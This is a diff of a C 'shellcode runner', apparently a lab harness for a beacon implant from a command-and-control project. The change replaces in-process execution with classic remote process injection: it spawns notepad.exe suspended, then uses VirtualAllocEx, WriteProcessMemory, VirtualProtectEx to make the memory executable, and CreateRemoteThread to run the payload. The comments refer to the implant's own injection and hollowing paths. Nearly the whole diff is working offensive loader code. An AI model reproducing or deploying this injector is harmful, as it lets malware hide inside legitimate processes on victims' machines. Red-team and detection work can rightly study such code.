@@ -1,158 +1,157 @@
 /*
- * Lab harness: map a raw shellcode .bin, jump to shellcode_entry (x64, Windows).
- * Build (cross, from imps/win-stargate):  make runner
+ * Lab harness: map beacon.bin at an OS-chosen base and run it (same contract as
+ * windows_noldr inject / hollow_rs): VirtualAllocEx → WriteProcessMemory → execute
+ * at offset 0.
  *
- * Usage:
- *   tools\shellcode_runner.exe [path\to\beacon.bin] [entry_offset_hex] [alloc_base_hex]
+ * CreateRemoteThread is used instead of QueueUserAPC: Notepad's UI thread is not
+ * alertable. The implant's own inject path uses NtAlertResumeThread, which is.
  *
- * - The flat .bin from "make raw" is .rdata + .text + .data concatenated. The first byte
- *   is NOT the entry — code starts after the .rdata prefix. "make raw" also writes
- *   path.entry_offset (same name as the .bin plus ".entry_offset") with one hex line.
- *   If you omit entry_offset_hex, the runner reads that sidecar next to the binary.
- * - alloc_base_hex: optional VirtualAlloc hint (e.g. 0x0000014000000000). Often NULL is fine
- *   if the shellcode is position-independent.
- * - If the shellcode returns, you will see "returned" on the console.
+ * Usage: shellcode_runner.exe [path\to\beacon.bin]
  */
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <string.h>
-#include <ctype.h>
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
-static unsigned long long parse_hex(const char *s, int *ok)
+#include <stdio.h>
+#include <stdlib.h>
+
+#ifndef CREATE_SUSPENDED
+#  define CREATE_SUSPENDED 0x00000004
+#endif
+
+#define PIC_STACK_SIZE ((SIZE_T)(4u * 1024u * 1024u))
+
+static unsigned char *read_all(const char *path, size_t *out_n)
 {
-    char *end = NULL;
-    unsigned long long v;
-    *ok = 0;
-    while (s && isspace((unsigned char)*s)) s++;
-    if (!s || !*s) return 0;
-    v = strtoull(s, &end, 0);
-    if (end && end != s && (*end == '\0' || isspace((unsigned char)*end))) {
-        *ok = 1;
-        return v;
+    FILE *f = NULL;
+    unsigned char *buf = NULL;
+    long sz;
+
+    *out_n = 0;
+    f = fopen(path, "rb");
+    if (!f) {
+        fprintf(stderr, "shellcode_runner: cannot open %s\n", path);
+        return NULL;
     }
-    return 0;
-}
-
-/* path + ".entry_offset" e.g. beacon.bin -> beacon.bin.entry_offset */
-static int read_sidecar_offset(const char *path, unsigned long long *out)
-{
-    static const char suf[] = ".entry_offset";
-    size_t plen = strlen(path);
-    char *side = (char *)malloc(plen + sizeof suf);
-    if (!side) return 0;
-    memcpy(side, path, plen);
-    memcpy(side + plen, suf, sizeof suf);
-
-    FILE *f = fopen(side, "r");
-    free(side);
-    if (!f) return 0;
-    char buf[128];
-    if (!fgets(buf, sizeof buf, f)) {
+    if (fseek(f, 0, SEEK_END) != 0) {
+        fprintf(stderr, "shellcode_runner: seek error %s\n", path);
         fclose(f);
-        return 0;
+        return NULL;
+    }
+    sz = ftell(f);
+    if (sz < 1) {
+        fprintf(stderr, "shellcode_runner: empty or invalid size %s\n", path);
+        fclose(f);
+        return NULL;
+    }
+    if (fseek(f, 0, SEEK_SET) != 0) {
+        fprintf(stderr, "shellcode_runner: seek error %s\n", path);
+        fclose(f);
+        return NULL;
+    }
+    buf = (unsigned char *)malloc((size_t)sz);
+    if (!buf) {
+        fprintf(stderr, "shellcode_runner: out of memory\n");
+        fclose(f);
+        return NULL;
+    }
+    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
+        fprintf(stderr, "shellcode_runner: read error %s\n", path);
+        free(buf);
+        fclose(f);
+        return NULL;
     }
     fclose(f);
-    int ok = 0;
-    *out = parse_hex(buf, &ok);
-    return ok;
+    *out_n = (size_t)sz;
+    return buf;
+}
+
+static void fail_child(PROCESS_INFORMATION *pi, LPVOID remote, unsigned char *shellcode)
+{
+    if (remote)
+        VirtualFreeEx(pi->hProcess, remote, 0, MEM_RELEASE);
+    TerminateProcess(pi->hProcess, 1);
+    CloseHandle(pi->hThread);
+    CloseHandle(pi->hProcess);
+    free(shellcode);
 }
 
 int main(int argc, char **argv)
 {
     const char *path = (argc > 1) ? argv[1] : "beacon.bin";
-    unsigned long long entry_off = 0;
-    int have_entry = 0;
+    size_t n = 0;
+    unsigned char *shellcode = read_all(path, &n);
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    LPVOID remote = NULL;
+    SIZE_T written = 0;
+    HANDLE inj_th;
+    DWORD old_prot = 0;
 
-    if (argc > 2) {
-        int ok = 0;
-        entry_off = parse_hex(argv[2], &ok);
-        if (ok) have_entry = 1;
-    }
-    if (!have_entry) {
-        unsigned long long sc = 0;
-        if (read_sidecar_offset(path, &sc)) {
-            entry_off = sc;
-            have_entry = 1;
-        }
-    }
-    if (!have_entry) {
-        fprintf(stderr,
-                "shellcode_runner: missing entry offset. Build with \"make raw\" and copy "
-                "%s.entry_offset next to the binary, or pass offset in hex as argv[2] "
-                "(see imps/win-stargate/README.md).\n",
-                path);
+    if (!shellcode)
         return 1;
-    }
 
-    void *fixed = NULL;
-    if (argc > 3) {
-        int ok = 0;
-        unsigned long long u = parse_hex(argv[3], &ok);
-        if (ok && u != 0) fixed = (void *)(uintptr_t)u;
-    }
+    ZeroMemory(&si, sizeof si);
+    si.cb = sizeof si;
+    ZeroMemory(&pi, sizeof pi);
 
-    FILE *f = fopen(path, "rb");
-    if (!f) {
-        fprintf(stderr, "shellcode_runner: cannot open %s\n", path);
-        return 1;
-    }
-    fseek(f, 0, SEEK_END);
-    long n = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (n < 1) {
-        fprintf(stderr, "shellcode_runner: file empty or size error: %s\n", path);
-        fclose(f);
-        return 1;
-    }
-
-    if ((unsigned long long)n < entry_off) {
-        fprintf(stderr, "shellcode_runner: entry offset 0x%llx past end of file (%ld)\n",
-                (unsigned long long)entry_off, n);
-        fclose(f);
-        return 1;
-    }
-
-    void *map = NULL;
-    if (fixed) {
-        map = VirtualAlloc(fixed, (SIZE_T)n, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        if (!map) {
-            fprintf(stderr,
-                    "shellcode_runner: VirtualAlloc at %p failed (err %lu) — try without base.\n",
-                    fixed, (unsigned long)GetLastError());
+    {
+        char cmdline[] = "C:\\Windows\\System32\\notepad.exe";
+        if (!CreateProcessA(NULL, cmdline, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si,
+                            &pi)) {
+            fprintf(stderr, "shellcode_runner: CreateProcessA failed (%lu)\n",
+                    (unsigned long)GetLastError());
+            free(shellcode);
             return 1;
         }
-    } else {
-        map = VirtualAlloc(NULL, (SIZE_T)n, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     }
-    if (!map) {
-        fprintf(stderr, "shellcode_runner: VirtualAlloc failed: %lu\n", (unsigned long)GetLastError());
-        fclose(f);
+
+    remote = VirtualAllocEx(pi.hProcess, NULL, n, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (!remote) {
+        fprintf(stderr, "shellcode_runner: VirtualAllocEx failed (%lu)\n",
+                (unsigned long)GetLastError());
+        fail_child(&pi, NULL, shellcode);
         return 1;
     }
 
-    if (fread(map, 1, (size_t)n, f) != (size_t)n) {
-        fprintf(stderr, "shellcode_runner: short read from %s\n", path);
-        VirtualFree(map, 0, MEM_RELEASE);
-        fclose(f);
+    if (!WriteProcessMemory(pi.hProcess, remote, shellcode, n, &written) || written != n) {
+        fprintf(stderr, "shellcode_runner: WriteProcessMemory failed (%lu)\n",
+                (unsigned long)GetLastError());
+        fail_child(&pi, remote, shellcode);
         return 1;
     }
-    fclose(f);
+    free(shellcode);
+    shellcode = NULL;
 
-    unsigned char *entry = (unsigned char *)map + entry_off;
-    FlushInstructionCache(GetCurrentProcess(), entry, (SIZE_T)(n - (long)entry_off));
+    if (!VirtualProtectEx(pi.hProcess, remote, n, PAGE_EXECUTE_READWRITE, &old_prot)) {
+        fprintf(stderr, "shellcode_runner: VirtualProtectEx failed (%lu)\n",
+                (unsigned long)GetLastError());
+        fail_child(&pi, remote, NULL);
+        return 1;
+    }
+    FlushInstructionCache(pi.hProcess, remote, (SIZE_T)n);
 
-    printf("shellcode_runner: %ld bytes at %p, entry at +0x%llx (%p)", n, map,
-           (unsigned long long)entry_off, (void *)entry);
-    if (fixed) printf(", alloc hint %p", fixed);
-    printf(" — calling...\n");
+    inj_th = CreateRemoteThread(pi.hProcess, NULL, PIC_STACK_SIZE,
+                                (LPTHREAD_START_ROUTINE)(void *)remote, NULL, 0, NULL);
+    if (!inj_th) {
+        fprintf(stderr, "shellcode_runner: CreateRemoteThread failed (%lu)\n",
+                (unsigned long)GetLastError());
+        fail_child(&pi, remote, NULL);
+        return 1;
+    }
+    CloseHandle(inj_th);
+
+    if (ResumeThread(pi.hThread) == (DWORD)-1) {
+        fprintf(stderr, "shellcode_runner: ResumeThread failed (%lu)\n",
+                (unsigned long)GetLastError());
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return 1;
+    }
+
+    printf("shellcode_runner: %zu bytes at %p (OS base, entry +0), 4MiB stack.\n", n, remote);
     fflush(stdout);
 
-    void (*sc)(void) = (void (*)(void))entry;
-    sc();
-
-    printf("shellcode_runner: returned from shellcode.\n");
-    VirtualFree(map, 0, MEM_RELEASE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     return 0;
 }
